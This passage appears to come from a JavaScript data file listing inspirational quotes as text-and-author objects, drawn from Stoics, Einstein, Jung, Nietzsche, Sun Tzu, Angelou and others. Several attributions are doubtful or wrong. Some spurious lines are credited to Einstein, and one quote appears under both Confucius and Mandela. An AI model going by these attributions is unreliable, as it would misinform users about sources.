        { text: "The privilege of a lifetime is to become who you truly are.", author: "Carl Jung" },
        { text: "Between stimulus and response there is a space. In that space is our power to choose our response.", author: "Viktor Frankl" },
        { text: "When we are no longer able to change a situation, we are challenged to change ourselves.", author: "Viktor Frankl" },
        { text: "Everything can be taken from a man but one thing: the last of the human freedoms — to choose one's attitude.", author: "Viktor Frankl" },
        { text: "Forget safety. Live where you fear to live. Destroy your reputation. Be notorious.", author: "Rumi" },
        { text: "The garden of the world has no limits except in your mind.", author: "Rumi" },
        { text: "Silence is the language of God. All else is poor translation.", author: "Rumi" },
        { text: "You were born with wings. Why prefer to crawl through life?", author: "Rumi" },
        { text: "Let yourself be silently drawn by the strange pull of what you really love. It will not lead you astray.", author: "Rumi" },
        { text: "Respond to every call that excites your spirit.", author: "Rumi" },
        { text: "Travel light, live light, spread the light, be the light.", author: "Yogi Bhajan" },
        { text: "The only person you are destined to become is the person you decide to be.", author: "Ralph Waldo Emerson" },
        { text: "The wound is the place where the light enters you.", author: "Rumi" },
        { text: "Be patient. Everything comes to you in the right moment.", author: "Buddha" },
        { text: "With the new day comes new strength and new thoughts.", author: "Eleanor Roosevelt" },
        { text: "The future belongs to those who believe in the beauty of their dreams.", author: "Eleanor Roosevelt" },
        { text: "No one can make you feel inferior without your consent.", author: "Eleanor Roosevelt" },
        { text: "The best and most beautiful things in the world cannot be seen or even touched. They must be felt with the heart.", author: "Helen Keller" },
        { text: "Courage is not the absence of fear. It is acting in spite of it.", author: "Mark Twain" },
        { text: "Stay hungry, stay foolish.", author: "Steve Jobs" },
        { text: "Your time is limited. Do not waste it living someone else's life.", author: "Steve Jobs" },
        { text: "Innovation distinguishes between a leader and a follower.", author: "Steve Jobs" },
        { text: "Have the courage to follow your heart and intuition. They somehow already know what you truly want to become.", author: "Steve Jobs" },
        { text: "The people who are crazy enough to think they can change the world are the ones who do.", author: "Steve Jobs" },
        { text: "Simplicity is the ultimate form of sophistication.", author: "Clare Boothe Luce" },
        { text: "In a gentle way, you can shake the world.", author: "Mahatma Gandhi" },
        { text: "Strength does not come from physical capacity. It comes from an indomitable will.", author: "Mahatma Gandhi" },
        { text: "The weak can never forgive. Forgiveness is the attribute of the strong.", author: "Mahatma Gandhi" },
        { text: "An eye for an eye only ends up making the whole world blind.", author: "Mahatma Gandhi" },
        { text: "First they ignore you, then they laugh at you, then they fight you, then you win.", author: "Mahatma Gandhi" },
        { text: "Darkness cannot drive out darkness. Only light can do that.", author: "Martin Luther King Jr." },
        { text: "Injustice anywhere is a threat to justice everywhere.", author: "Martin Luther King Jr." },
        { text: "The time is always right to do what is right.", author: "Martin Luther King Jr." },
        { text: "Our lives begin to end the day we become silent about things that matter.", author: "Martin Luther King Jr." },
        { text: "Faith is taking the first step even when you cannot see the whole staircase.", author: "Martin Luther King Jr." },
        { text: "Intelligence plus character — that is the goal of true education.", author: "Martin Luther King Jr." },
        { text: "Only in the darkness can you see the stars.", author: "Martin Luther King Jr." },
        { text: "We must accept finite disappointment but never lose infinite hope.", author: "Martin Luther King Jr." },
        { text: "The greatest glory in living lies not in never falling, but in rising every time we fall.", author: "Nelson Mandela" },
        { text: "Do not judge me by my successes. Judge me by how many times I fell down and got back up again.", author: "Nelson Mandela" },
        { text: "May your choices reflect your hopes, not your fears.", author: "Nelson Mandela" },
        { text: "What counts in life is not the mere fact that we have lived.", author: "Nelson Mandela" },
        { text: "There is no passion to be found playing small — in settling for a life that is less than the one you are capable of living.", author: "Nelson Mandela" },
        { text: "Life is ten percent what happens to you and ninety percent how you respond to it.", author: "Lou Holtz" },
        { text: "The mind is not a vessel to be filled but a fire to be kindled.", author: "Plutarch" },
        { text: "Expect nothing. Appreciate everything.", author: "Zen Proverb" },
        { text: "Let go or be dragged.", author: "Zen Proverb" },
        { text: "The obstacle in the path becomes the path. Never forget, within every obstacle is an opportunity to improve our condition.", author: "Ryan Holiday" },
        { text: "Ego is the enemy.", author: "Ryan Holiday" },
        { text: "Stillness is the key.", author: "Ryan Holiday" },
        { text: "You could leave life right now. Let that determine what you do and say and think.", author: "Marcus Aurelius" },
        { text: "The impediment to action advances action. What stands in the way becomes the way.", author: "Marcus Aurelius" },
        { text: "When you arise in the morning, think of what a precious privilege it is to be alive.", author: "Marcus Aurelius" },
        { text: "Very little is needed to make a happy life. It is all within yourself, in your way of thinking.", author: "Marcus Aurelius" },
        { text: "Accept the things to which fate binds you, and love the people with whom fate brings you together.", author: "Marcus Aurelius" },
        { text: "Dwell on the beauty of life. Watch the stars, and see yourself running with them.", author: "Marcus Aurelius" },
        { text: "Loss is nothing else but change, and change is nature's delight.", author: "Marcus Aurelius" },
        { text: "True happiness is to enjoy the present without anxious dependence upon the future.", author: "Seneca" },
        { text: "As is a tale, so is life: not how long it is, but how good it is, is what matters.", author: "Seneca" },
        { text: "Hang on to your youthful enthusiasms — you will be able to use them better when you are older.", author: "Seneca" },
        { text: "Sometimes even to live is an act of courage.", author: "Seneca" },
        { text: "Begin at once to live, and count each separate day as a separate life.", author: "Seneca" },
        { text: "A gem cannot be polished without friction, nor a man perfected without trials.", author: "Seneca" },
        { text: "Life is long if you know how to use it.", author: "Seneca" },
        { text: "He who fears death will never do anything worthy of a man who is alive.", author: "Seneca" },
        { text: "Where fear is, happiness is not.", author: "Seneca" },
        { text: "All cruelty springs from weakness.", author: "Seneca" },
        { text: "What need is there to weep over parts of life? The whole of it calls for tears.", author: "Seneca" },
        { text: "To be everywhere is to be nowhere.", author: "Seneca" },
        { text: "Throw me to the wolves and I will return leading the pack.", author: "Seneca" },
        { text: "It does not matter how slowly you go as long as you do not stop.", author: "Confucius" },
        { text: "Our greatest glory is not in never falling, but in rising every time we fall.", author: "Confucius" },
        { text: "Everything has beauty, but not everyone sees it.", author: "Confucius" },
        { text: "Real knowledge is to know the extent of one's ignorance.", author: "Confucius" },
        { text: "The funniest people are the saddest ones.", author: "Confucius" },
        { text: "Study the past if you would define the future.", author: "Confucius" },
        { text: "When it is obvious that goals cannot be reached, don't adjust the goals, adjust the action steps.", author: "Confucius" },
        { text: "It is not the mountain we conquer, but ourselves.", author: "Edmund Hillary" },
        { text: "The greatest wealth is to live content with little.", author: "Plato" },
        { text: "Wise men speak because they have something to say. Fools because they have to say something.", author: "Plato" },
        { text: "Courage is knowing what not to fear.", author: "Plato" },
        { text: "Human behavior flows from three main sources: desire, emotion, and knowledge.", author: "Plato" },
        { text: "Do not spoil what you have by desiring what you have not.", author: "Epicurus" },
        { text: "Not what we have but what we enjoy constitutes our abundance.", author: "Epicurus" },
        { text: "He who is not satisfied with a little is satisfied with nothing.", author: "Epicurus" },
        { text: "Death does not concern us, because as long as we exist, death is not here.", author: "Epicurus" },
        { text: "The art of living well and the art of dying well are one.", author: "Epicurus" },
        { text: "If you wish to be a writer, write.", author: "Epictetus" },
        { text: "Make the best use of what is in your power, and take the rest as it happens.", author: "Epictetus" },
        { text: "Only the educated are free.", author: "Epictetus" },
        { text: "It is not things that disturb us, but our judgments about things.", author: "Epictetus" },
        { text: "Other people's views and troubles can be contagious. Don't sabotage yourself by unwittingly adopting negative, unproductive attitudes.", author: "Epictetus" },
        { text: "Don't explain your philosophy. Embody it.", author: "Epictetus" },
        { text: "You become what you give your attention to.", author: "Epictetus" },
        { text: "Wealth consists not in having great possessions, but in having few wants.", author: "Epictetus" },
        { text: "Circumstances don't make the man, they only reveal him to himself.", author: "Epictetus" },
        { text: "Caretake this moment. Immerse yourself in its particulars.", author: "Epictetus" },
        { text: "The soul becomes dyed with the color of its thoughts.", author: "Marcus Aurelius" },
        { text: "The things you think about determine the quality of your mind.", author: "Marcus Aurelius" },
        { text: "Time is a river, a violent current of events, glimpsed once and already carried past us, and another follows and is gone.", author: "Marcus Aurelius" },
        { text: "Do every act of your life as though it were the very last act of your life.", author: "Marcus Aurelius" },
        { text: "If it is not right, do not do it. If it is not true, do not say it.", author: "Marcus Aurelius" },
        { text: "How much more grievous are the consequences of anger than the causes of it.", author: "Marcus Aurelius" },
        { text: "Receive without conceit, release without struggle.", author: "Marcus Aurelius" },
        { text: "Almost nothing material is needed for a happy life, for he who has understood existence.", author: "Marcus Aurelius" },
        { text: "Choose not to be harmed and you won't feel harmed. Don't feel harmed and you haven't been.", author: "Marcus Aurelius" },
        { text: "Never esteem anything as of advantage to you that will make you break your word or lose your self-respect.", author: "Marcus Aurelius" },
        { text: "Adapt yourself to the things among which your lot has been cast, and love sincerely the fellow creatures with whom destiny has ordained that you shall live.", author: "Marcus Aurelius" },
        { text: "Be tolerant with others and strict with yourself.", author: "Marcus Aurelius" },
        { text: "No man is happy who does not think himself so.", author: "Publilius Syrus" },
        { text: "A bird sitting on a tree is never afraid of the branch breaking, because its trust is not on the branch but on its own wings.", author: "Charlie Wardle" },
        { text: "The only way to make sense out of change is to plunge into it, move with it, and join the dance.", author: "Alan Watts" },
        { text: "Muddy water is best cleared by leaving it alone.", author: "Alan Watts" },
        { text: "The meaning of life is just to be alive. It is so plain and so obvious and so simple.", author: "Alan Watts" },
        { text: "You are the universe experiencing itself.", author: "Alan Watts" },
        { text: "A man who dares to waste one hour of time has not discovered the value of life.", author: "Charles Darwin" },
        { text: "I have no special talents. I am only passionately curious.", author: "Albert Einstein" },
        { text: "The desire for safety stands against every great and noble enterprise.", author: "Tacitus" },
        { text: "We are what we repeatedly do. Excellence then is not an act, but a habit.", author: "Will Durant" },
        { text: "I am the master of my fate, I am the captain of my soul.", author: "William Ernest Henley" },
        { text: "Out of the night that covers me, black as the pit from pole to pole, I thank whatever gods may be for my unconquerable soul.", author: "William Ernest Henley" },
        { text: "There are years that ask questions and years that answer.", author: "Zora Neale Hurston" },
        { text: "Ships don't sink because of the water around them. Ships sink because of the water that gets in them.", author: "Unknown" },
        { text: "A smooth sea never made a skilled sailor.", author: "Franklin D. Roosevelt" },
        { text: "The scariest moment is always just before you start.", author: "Stephen King" },
        { text: "Get busy living, or get busy dying.", author: "Stephen King" },
        { text: "Don't let the noise of others' opinions drown out your own inner voice.", author: "Steve Jobs" },
        { text: "Death is very likely the single best invention of life. It is life's change agent.", author: "Steve Jobs" },
        { text: "Remembering that you are going to die is the best way I know to avoid the trap of thinking you have something to lose.", author: "Steve Jobs" },
        { text: "Here's to the crazy ones. The misfits. The rebels. The troublemakers. The round pegs in square holes.", author: "Steve Jobs" },
        { text: "The sword that kills is also the sword that gives life.", author: "Yagyu Munenori" },
        { text: "Fixedness of position is death. Fluidity is life.", author: "Miyamoto Musashi" },
        { text: "In strategy your spiritual bearing must not be any different from normal.", author: "Miyamoto Musashi" },
        { text: "Today is victory over yourself of yesterday. Tomorrow is your victory over lesser men.", author: "Miyamoto Musashi" },
        { text: "Do nothing that is of no use.", author: "Miyamoto Musashi" },
        { text: "Perceive that which cannot be seen with the eye.", author: "Miyamoto Musashi" },
        { text: "Respect Buddha and the gods without counting on their help.", author: "Miyamoto Musashi" },
        { text: "All men can see these tactics whereby I conquer, but what none can see is the strategy out of which victory is evolved.", author: "Sun Tzu" },
        { text: "Appear weak when you are strong and strong when you are weak.", author: "Sun Tzu" },
        { text: "The supreme art of war is to subdue the enemy without fighting.", author: "Sun Tzu" },
        { text: "Let your plans be dark and impenetrable as night, and when you move, fall like a thunderbolt.", author: "Sun Tzu" },
        { text: "Every battle is won before it is ever fought.", author: "Sun Tzu" },
        { text: "Opportunities multiply as they are seized.", author: "Sun Tzu" },
        { text: "The roots of education are bitter, but the fruit is sweet.", author: "Aristotle" },
        { text: "I fear not the man who has practiced ten thousand kicks once, but I fear the man who has practiced one kick ten thousand times.", author: "Bruce Lee" },
        { text: "If you spend too much time thinking about a thing, you will never get it done.", author: "Bruce Lee" },
        { text: "A wise man can learn more from a foolish question than a fool can learn from a wise answer.", author: "Bruce Lee" },
        { text: "Empty your cup so that it may be filled. Become devoid to gain totality.", author: "Bruce Lee" },
        { text: "Ever tried. Ever failed. No matter. Try again. Fail again. Fail better.", author: "Samuel Beckett" },
        { text: "In the depth of winter, I finally learned that within me there lay an invincible summer.", author: "Albert Camus" },
        { text: "Man is the only creature who refuses to be what he is.", author: "Albert Camus" },
        { text: "Should I kill myself, or have a cup of coffee?", author: "Albert Camus" },
        { text: "The only way to deal with an unfree world is to become so absolutely free that your very existence is an act of rebellion.", author: "Albert Camus" },
        { text: "You will never be happy if you continue to search for what happiness consists of.", author: "Albert Camus" },
        { text: "Man is condemned to be free. Because once thrown into the world, he is responsible for everything he does.", author: "Jean-Paul Sartre" },
        { text: "Freedom is what we do with what is done to us.", author: "Jean-Paul Sartre" },
        { text: "Hell is other people.", author: "Jean-Paul Sartre" },
        { text: "If you are lonely when you are alone, you are in bad company.", author: "Jean-Paul Sartre" },
        { text: "To love is to recognize yourself in another.", author: "Eckhart Tolle" },
        { text: "Realize deeply that the present moment is all you ever have.", author: "Eckhart Tolle" },
        { text: "Life is the dancer and you are the dance.", author: "Eckhart Tolle" },
        { text: "What a liberation to realize that the voice in my head is not who I am.", author: "Eckhart Tolle" },
        { text: "Wherever you are, be there totally.", author: "Eckhart Tolle" },
        { text: "The primary cause of unhappiness is never the situation but your thoughts about it.", author: "Eckhart Tolle" },
        { text: "Those who know do not speak. Those who speak do not know.", author: "Lao Tzu" },
        { text: "Great acts are made up of small deeds.", author: "Lao Tzu" },
        { text: "Stop leaving and you will arrive. Stop searching and you will see.", author: "Lao Tzu" },
        { text: "At the center of your being you have the answer. You know who you are and you know what you want.", author: "Lao Tzu" },
        { text: "If you correct your mind, the rest of your life will fall into place.", author: "Lao Tzu" },
        { text: "Respond intelligently even to unintelligent treatment.", author: "Lao Tzu" },
        { text: "Life is a series of natural and spontaneous changes. Don't resist them — that only creates sorrow.", author: "Lao Tzu" },
        { text: "When the student is ready, the teacher will appear. When the student is truly ready, the teacher will disappear.", author: "Lao Tzu" },
        { text: "The universe is under no obligation to make sense to you.", author: "Neil deGrasse Tyson" },
        { text: "We are all just walking each other home.", author: "Ram Dass" },
        { text: "Be here now.", author: "Ram Dass" },
        { text: "The game is not about becoming somebody, it is about becoming nobody.", author: "Ram Dass" },
        { text: "As long as the mind is enslaved, the body can never be free.", author: "Martin Luther King Jr." },
        { text: "The question is not whether we will be extremists, but what kind of extremists we will be.", author: "Martin Luther King Jr." },
        { text: "What does not destroy me makes me stronger.", author: "Friedrich Nietzsche" },
        { text: "He who has a why to live for can bear almost any how.", author: "Friedrich Nietzsche" },
        { text: "There is always some madness in love. But there is also always some reason in madness.", author: "Friedrich Nietzsche" },
        { text: "Become who you are.", author: "Friedrich Nietzsche" },
        { text: "God is dead. God remains dead. And we have killed him.", author: "Friedrich Nietzsche" },
        { text: "The snake which cannot cast its skin has to die.", author: "Friedrich Nietzsche" },
        { text: "Man is a rope stretched between the animal and the superhuman — a rope over an abyss.", author: "Friedrich Nietzsche" },
        { text: "I am a forest and a night of dark trees. But he who is not afraid of my darkness will find banks full of roses under my cypresses.", author: "Friedrich Nietzsche" },
        { text: "Invisible threads are the strongest ties.", author: "Friedrich Nietzsche" },
        { text: "One ought to hold on to one's heart, for if one lets it go, one soon loses control of the head too.", author: "Friedrich Nietzsche" },
        { text: "You have your way. I have my way. As for the right way, the correct way, and the only way, it does not exist.", author: "Friedrich Nietzsche" },
        { text: "The higher we soar, the smaller we appear to those who cannot fly.", author: "Friedrich Nietzsche" },
        { text: "Beware that, when fighting monsters, you yourself do not become a monster. For when you gaze long into the abyss, the abyss gazes also into you.", author: "Friedrich Nietzsche" },
        { text: "No tree, it is said, can grow to heaven unless its roots reach down to hell.", author: "Carl Jung" },
        { text: "Your visions will become clear only when you can look into your own heart.", author: "Carl Jung" },
        { text: "People will do anything, no matter how absurd, to avoid facing their own souls.", author: "Carl Jung" },
        { text: "Everything that irritates us about others can lead us to an understanding of ourselves.", author: "Carl Jung" },
        { text: "The most terrifying thing is to accept oneself completely.", author: "Carl Jung" },
        { text: "What you resist, persists.", author: "Carl Jung" },
        { text: "Where love rules, there is no will to power, and where power predominates, love is lacking.", author: "Carl Jung" },
        { text: "Loneliness does not come from having no people around you, but from being unable to communicate the things that seem important to you.", author: "Carl Jung" },
        { text: "Thinking is difficult, that is why most people judge.", author: "Carl Jung" },
        { text: "The meeting of two personalities is like the contact of two chemical substances. If there is any reaction, both are transformed.", author: "Carl Jung" },
        { text: "Show me a sane man and I will cure him for you.", author: "Carl Jung" },
        { text: "We cannot change anything until we accept it. Condemnation does not liberate, it oppresses.", author: "Carl Jung" },
        { text: "The shoe that fits one person pinches another. There is no recipe for living that suits all cases.", author: "Carl Jung" },
        { text: "One does not become enlightened by imagining figures of light, but by making the darkness conscious.", author: "Carl Jung" },
        { text: "In all chaos there is a cosmos, in all disorder a secret order.", author: "Carl Jung" },
        { text: "Normality is a paved road. It's comfortable to walk, but no flowers grow on it.", author: "Vincent van Gogh" },
        { text: "I would rather die of passion than of boredom.", author: "Vincent van Gogh" },
        { text: "What would life be if we had no courage to attempt anything?", author: "Vincent van Gogh" },
        { text: "Great things are not done by impulse, but by a series of small things brought together.", author: "Vincent van Gogh" },
        { text: "I put my heart and my soul into my work, and have lost my mind in the process.", author: "Vincent van Gogh" },
        { text: "If you hear a voice within you say you cannot paint, then by all means paint, and that voice will be silenced.", author: "Vincent van Gogh" },
        { text: "The purpose of our lives is to be happy.", author: "Dalai Lama" },
        { text: "If you think you are too small to make a difference, try sleeping with a mosquito.", author: "Dalai Lama" },
        { text: "Be kind whenever possible. It is always possible.", author: "Dalai Lama" },
        { text: "Choose to be optimistic, it feels better.", author: "Dalai Lama" },
        { text: "The planet does not need more successful people. It desperately needs more peacemakers, healers, restorers, storytellers, and lovers of every kind.", author: "Dalai Lama" },
        { text: "An open heart is an open mind.", author: "Dalai Lama" },
        { text: "Old friends pass away, new friends appear. It is just like the days.", author: "Dalai Lama" },
        { text: "There are only two days in the year that nothing can be done. One is called yesterday and the other is called tomorrow.", author: "Dalai Lama" },
        { text: "Know the rules well, so you can break them effectively.", author: "Dalai Lama" },
        { text: "Where ignorance is our master, there is no possibility of real peace.", author: "Dalai Lama" },
        { text: "Give the ones you love wings to fly, roots to come back, and reasons to stay.", author: "Dalai Lama" },
        { text: "True change is within. Leave the outside as it is.", author: "Dalai Lama" },
        { text: "The world as we have created it is a process of our thinking. It cannot be changed without changing our thinking.", author: "Albert Einstein" },
        { text: "Anyone who has never made a mistake has never tried anything new.", author: "Albert Einstein" },
        { text: "A person who never made a mistake never tried anything new.", author: "Albert Einstein" },
        { text: "The important thing is not to stop questioning. Curiosity has its own reason for existing.", author: "Albert Einstein" },
        { text: "Creativity is intelligence having fun.", author: "Albert Einstein" },
        { text: "Look deep into nature, and then you will understand everything better.", author: "Albert Einstein" },
        { text: "In the middle of every difficulty lies opportunity.", author: "Albert Einstein" },
        { text: "The only source of knowledge is experience.", author: "Albert Einstein" },
        { text: "Peace cannot be kept by force. It can only be achieved by understanding.", author: "Albert Einstein" },
        { text: "Life is like riding a bicycle. To keep your balance, you must keep moving.", author: "Albert Einstein" },
        { text: "There are two ways to live your life. One is as though nothing is a miracle. The other is as though everything is a miracle.", author: "Albert Einstein" },
        { text: "The definition of insanity is doing the same thing over and over again and expecting different results.", author: "Albert Einstein" },
        { text: "Weak people revenge. Strong people forgive. Intelligent people ignore.", author: "Albert Einstein" },
        { text: "I speak to everyone in the same way, whether he is the garbage man or the president of the university.", author: "Albert Einstein" },
        { text: "Reality is merely an illusion, albeit a very persistent one.", author: "Albert Einstein" },
        { text: "A question that sometimes drives me hazy: am I or are the others crazy?", author: "Albert Einstein" },
        { text: "The only thing that interferes with my learning is my education.", author: "Albert Einstein" },
        { text: "Few are those who see with their own eyes and feel with their own hearts.", author: "Albert Einstein" },
        { text: "The true sign of intelligence is not knowledge but imagination.", author: "Albert Einstein" },
        { text: "A clever person solves a problem. A wise person avoids it.", author: "Albert Einstein" },
        { text: "Black holes are where God divided by zero.", author: "Albert Einstein" },
        { text: "Great spirits have always encountered violent opposition from mediocre minds.", author: "Albert Einstein" },
        { text: "I'd rather be an optimist and a fool than a pessimist and right.", author: "Albert Einstein" },
        { text: "All religions, arts, and sciences are branches of the same tree.", author: "Albert Einstein" },
        { text: "It is the supreme art of the teacher to awaken joy in creative expression and knowledge.", author: "Albert Einstein" },
        { text: "Joy in looking and comprehending is nature's most beautiful gift.", author: "Albert Einstein" },
        { text: "We cannot solve our problems with the same thinking we used when we created them.", author: "Albert Einstein" },
        { text: "If I had an hour to solve a problem I'd spend 55 minutes thinking about the problem and five minutes thinking about solutions.", author: "Albert Einstein" },
        { text: "Once you stop learning, you start dying.", author: "Albert Einstein" },
        { text: "Not everything that can be counted counts, and not everything that counts can be counted.", author: "William Bruce Cameron" },
        { text: "The mind that opens to a new idea never returns to its original size.", author: "Albert Einstein" },
        { text: "Do what is right, not what is easy nor what is popular.", author: "Roy T. Bennett" },
        { text: "Instead of worrying about what you cannot control, shift your energy to what you can create.", author: "Roy T. Bennett" },
        { text: "Be mindful. Be grateful. Be positive. Be true. Be kind.", author: "Roy T. Bennett" },
        { text: "Don't be pushed around by the fears in your mind. Be led by the dreams in your heart.", author: "Roy T. Bennett" },
        { text: "Never lose hope. Storms make people stronger and never last forever.", author: "Roy T. Bennett" },
        { text: "Don't waste your time in anger, regrets, worries, and grudges. Life is too short to be unhappy.", author: "Roy T. Bennett" },
        { text: "No matter how much suffering you went through, you never wanted to let go of those memories.", author: "Haruki Murakami" },
        { text: "Pain is inevitable. Suffering is optional.", author: "Haruki Murakami" },
        { text: "And once the storm is over, you won't remember how you made it through, how you managed to survive. But one thing is certain. When you come out of the storm, you won't be the same person who walked in.", author: "Haruki Murakami" },
        { text: "Whatever it is you're seeking won't come in the form you're expecting.", author: "Haruki Murakami" },
        { text: "If you only read the books that everyone else is reading, you can only think what everyone else is thinking.", author: "Haruki Murakami" },
        { text: "Every one of us is losing something precious to us. Lost opportunities, lost possibilities, feelings we can never get back again.", author: "Haruki Murakami" },
        { text: "Closing your eyes isn't going to change anything. Nothing's going to disappear just because you can't see what's going on.", author: "Haruki Murakami" },
        { text: "Don't feel sorry for yourself. Only arseholes do that.", author: "Haruki Murakami" },
        { text: "Deep in the human unconscious is a pervasive need for a logical universe that makes sense. But the real universe is always one step beyond logic.", author: "Frank Herbert" },
        { text: "I must not fear. Fear is the mind-killer. Fear is the little-death that brings total obliteration.", author: "Frank Herbert" },
        { text: "The mystery of life isn't a problem to solve, but a reality to experience.", author: "Frank Herbert" },
        { text: "Without change, something sleeps inside us, and seldom awakens. The sleeper must awaken.", author: "Frank Herbert" },
        { text: "There is no real ending. It's just the place where you stop the story.", author: "Frank Herbert" },
        { text: "It is so easy to be wrong — and to persist in being wrong — when the costs of being wrong are paid by others.", author: "Thomas Sowell" },
        { text: "The problem isn't that Johnny can't read. The problem isn't even that Johnny can't think. The problem is that Johnny doesn't know what thinking is.", author: "Thomas Sowell" },
        { text: "People who enjoy meetings should not be in charge of anything.", author: "Thomas Sowell" },
        { text: "It is hard to imagine a more stupid or more dangerous way of making decisions than by putting those decisions in the hands of people who pay no price for being wrong.", author: "Thomas Sowell" },
        { text: "When you want to help people, you tell them the truth. When you want to help yourself, you tell them what they want to hear.", author: "Thomas Sowell" },
        { text: "The art of war is of vital importance to the State. It is a matter of life and death.", author: "Sun Tzu" },
        { text: "Know yourself and you will win all battles.", author: "Sun Tzu" },
        { text: "Strategy without tactics is the slowest route to victory. Tactics without strategy is the noise before defeat.", author: "Sun Tzu" },
        { text: "Do not repeat the tactics which have gained you one victory, but let your methods be regulated by the infinite variety of circumstances.", author: "Sun Tzu" },
        { text: "If you know the enemy and know yourself, you need not fear the result of a hundred battles.", author: "Sun Tzu" },
        { text: "Supreme excellence consists in breaking the enemy's resistance without fighting.", author: "Sun Tzu" },
        { text: "There is no instance of a nation benefiting from prolonged warfare.", author: "Sun Tzu" },
        { text: "The wise warrior avoids the battle.", author: "Sun Tzu" },
        { text: "Treat your men as you would your own beloved sons. And they will follow you into the deepest valley.", author: "Sun Tzu" },
        { text: "Old age is no place for sissies.", author: "Bette Davis" },
        { text: "People often say that motivation doesn't last. Well, neither does bathing — that's why we recommend it daily.", author: "Zig Ziglar" },
        { text: "The only difference between a good day and a bad day is your attitude.", author: "Dennis S. Brown" },
        { text: "You miss one hundred percent of the shots you don't take.", author: "Wayne Gretzky" },
        { text: "Whether you think you can or you think you can't, you're right.", author: "Henry Ford" },
        { text: "When everything seems to be going against you, remember that the airplane takes off against the wind, not with it.", author: "Henry Ford" },
        { text: "Don't find fault, find a remedy.", author: "Henry Ford" },
        { text: "Anyone who stops learning is old, whether at twenty or eighty. Anyone who keeps learning stays young.", author: "Henry Ford" },
        { text: "Coming together is a beginning. Keeping together is progress. Working together is success.", author: "Henry Ford" },
        { text: "Vision without execution is just hallucination.", author: "Henry Ford" },
        { text: "If everyone is moving forward together, then success takes care of itself.", author: "Henry Ford" },
        { text: "Failure is simply the opportunity to begin again, this time more intelligently.", author: "Henry Ford" },
        { text: "You can't build a reputation on what you are going to do.", author: "Henry Ford" },
        { text: "Quality means doing it right when no one is looking.", author: "Henry Ford" },
        { text: "Nothing in life is to be feared, it is only to be understood. Now is the time to understand more, so that we may fear less.", author: "Marie Curie" },
        { text: "Be less curious about people and more curious about ideas.", author: "Marie Curie" },
        { text: "You cannot hope to build a better world without improving the individuals.", author: "Marie Curie" },
        { text: "One never notices what has been done. One can only see what remains to be done.", author: "Marie Curie" },
        { text: "I was taught that the way of progress was neither swift nor easy.", author: "Marie Curie" },
        { text: "We must have perseverance and above all confidence in ourselves.", author: "Marie Curie" },
        { text: "I never dreamed about success. I worked for it.", author: "Estee Lauder" },
        { text: "The question isn't who is going to let me. It's who is going to stop me.", author: "Ayn Rand" },
        { text: "Do not let your fire go out, spark by irreplaceable spark.", author: "Ayn Rand" },
        { text: "The ladder of success is best climbed by stepping on the rungs of opportunity.", author: "Ayn Rand" },
        { text: "A creative man is motivated by the desire to achieve, not by the desire to beat others.", author: "Ayn Rand" },
        { text: "Learn the rules like a pro, so you can break them like an artist.", author: "Pablo Picasso" },
        { text: "Good artists copy, great artists steal.", author: "Pablo Picasso" },
        { text: "Art washes away from the soul the dust of everyday life.", author: "Pablo Picasso" },
        { text: "Inspiration exists, but it has to find you working.", author: "Pablo Picasso" },
        { text: "Art is a lie that makes us realize truth.", author: "Pablo Picasso" },
        { text: "I am always doing that which I cannot do, in order that I may learn how to do it.", author: "Pablo Picasso" },
        { text: "Others have seen what is and asked why. I have seen what could be and asked why not.", author: "Pablo Picasso" },
        { text: "Everything you can imagine is real.", author: "Pablo Picasso" },
        { text: "If you want something you've never had, you must be willing to do something you've never done.", author: "Thomas Jefferson" },
        { text: "Honesty is the first chapter in the book of wisdom.", author: "Thomas Jefferson" },
        { text: "Nothing can stop the man with the right mental attitude from achieving his goal.", author: "Thomas Jefferson" },
        { text: "I find that the harder I work, the more luck I seem to have.", author: "Thomas Jefferson" },
        { text: "In matters of style, swim with the current. In matters of principle, stand like a rock.", author: "Thomas Jefferson" },
        { text: "Don't talk about what you have done or what you are going to do.", author: "Thomas Jefferson" },
        { text: "I like the dreams of the future better than the history of the past.", author: "Thomas Jefferson" },
        { text: "Walking is the best possible exercise. Habituate yourself to walk very far.", author: "Thomas Jefferson" },
        { text: "We hold these truths to be self-evident: that all men are created equal.", author: "Thomas Jefferson" },
        { text: "Power concedes nothing without a demand. It never did and it never will.", author: "Frederick Douglass" },
        { text: "If there is no struggle, there is no progress.", author: "Frederick Douglass" },
        { text: "Once you learn to read, you will be forever free.", author: "Frederick Douglass" },
        { text: "I prefer to be true to myself, even at the hazard of incurring the ridicule of others.", author: "Frederick Douglass" },
        { text: "It is easier to build strong children than to repair broken men.", author: "Frederick Douglass" },
        { text: "A gentleman is one who puts more into the world than he takes out.", author: "George Bernard Shaw" },
        { text: "Life isn't about finding yourself. Life is about creating yourself.", author: "George Bernard Shaw" },
        { text: "Progress is impossible without change, and those who cannot change their minds cannot change anything.", author: "George Bernard Shaw" },
        { text: "Those who can't change their minds can't change anything.", author: "George Bernard Shaw" },
        { text: "People who say it cannot be done should not interrupt those who are doing it.", author: "George Bernard Shaw" },
        { text: "The single biggest problem in communication is the illusion that it has taken place.", author: "George Bernard Shaw" },
        { text: "Beware of false knowledge, it is more dangerous than ignorance.", author: "George Bernard Shaw" },
        { text: "Write it. Shoot it. Publish it. Crochet it, sauté it, whatever. Make.", author: "Joss Whedon" },
        { text: "I can be changed by what happens to me. But I refuse to be reduced by it.", author: "Maya Angelou" },
        { text: "Success is liking yourself, liking what you do, and liking how you do it.", author: "Maya Angelou" },
        { text: "When someone shows you who they are, believe them the first time.", author: "Maya Angelou" },
        { text: "You alone are enough. You have nothing to prove to anybody.", author: "Maya Angelou" },
        { text: "Life is not measured by the number of breaths we take, but by the moments that take our breath away.", author: "Maya Angelou" },
        { text: "Try to be a rainbow in someone's cloud.", author: "Maya Angelou" },
        { text: "Still I rise.", author: "Maya Angelou" },
        { text: "Prejudice is a burden that confuses the past, threatens the future, and renders the present inaccessible.", author: "Maya Angelou" },
        { text: "My mission in life is not merely to survive, but to thrive.", author: "Maya Angelou" },
        { text: "If I am not good to myself, how can I expect anyone else to be good to me?", author: "Maya Angelou" },
        { text: "You cannot swim for new horizons until you have courage to lose sight of the shore.", author: "William Faulkner" },
        { text: "The past is never dead. It's not even past.", author: "William Faulkner" },
        { text: "Don't bother just to be better than your contemporaries or predecessors. Try to be better than yourself.", author: "William Faulkner" },
        { text: "Always dream and shoot higher than you know you can do.", author: "William Faulkner" },
        { text: "Never be afraid to sit awhile and think.", author: "Lorraine Hansberry" },
        { text: "The most common way people give up their power is by thinking they don't have any.", author: "Alice Walker" },
